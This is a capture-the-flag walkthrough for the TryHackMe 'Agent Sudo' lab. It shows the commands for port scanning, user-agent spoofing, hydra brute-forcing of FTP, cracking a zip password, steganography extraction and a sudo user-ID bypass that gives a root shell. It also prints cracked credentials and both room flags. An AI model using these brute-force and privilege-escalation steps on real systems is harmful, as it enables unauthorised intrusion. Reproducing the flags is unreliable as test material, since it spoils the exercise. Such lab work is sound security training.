###### You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 
Room: https://tryhackme.com/room/agentsudoctf
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xxx.xxx  
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I couldn't discover any directories on the website, so I assume it's there only to give us some hints.  
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

It indicates us that in order to have access to the website we might want to change our user-agent to another letter.  

I started to try every letter as a user-agent, starting from A. **C** seems to be the lucky one.  
> curl -A "C" -L xx.xx.xxx.xx

```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

The next hint indicates that the user chris is using a weak password.  
We have two services left, FTP and SSH.  
After trying to bruteforce SSH with no result, the only option is now FTP.  

> sudo hydra -l chris -P /usr/share/wordlists/rockyou.txt  xx.xx.xxx.xxx ftp

```
[21][ftp] host: xx.xx.xxx.xxx   login: chris   password: crystal
```

We got 3 files from FTP.
```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

**content of To_agentJ.txt**
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Using **steghide** on the .jpg photo, we can see that it has embedded data protected by a unknown passphrase.
Steghide can't help us with .png photos. Let's give **binwalk** a try.  

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

It seems it contains a zip archive inside it.  

**binwalk** -e cutie.png

Among extracted files, there is a .zip archive called **8702.zip** which is password protected.  

**zip2john** 8702.zip > hash  
**john** hash  

> alien            (8702.zip/To_agentR.txt)

Since **unzip -P alien 8702.zip** seems to give us some kind of error ([read more](https://newbedev.com/error-trying-to-unzip-file-need-pk-compat-v6-1-can-do-v4-6)), we'll extract the archive using **7zip**.

**7z x** 8702.zip -palien

**Content of To_agentR.txt**
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

If we convert **QXJlYTUx** from base64 back to ASCII, we get the passphase **Area51** which can be used to extract the data embedded in the other photo.  

**steghide** extract -sf cute-alien.jpg
```
wrote extracted data to "message.txt".



Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We got SSH credentials.  

**Firsrt flag, located in /home/james, is b03d975e8c92a7c04146cfa7a5a313c7** **[1]**.

Since we don't have access to run anything as sudo, I followed the room hints and checked the sudo version.
```
Sudo version 1.8.21p2
```

After some research, I found that this version of sudo can be exploited, elevating the privileges of the user to root.  

> sudo -u \#$((0xffffffff)) /bin/bash
```
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~#
```

**The second and final flag is at /root/root.txt and is b53a02f55b57d4439e3341834d70c062** **[2]**.
##

**Note**: At the steganography stages, we could've created a custom wordlist themed on aliens and bruteforce the passphrase directly.  


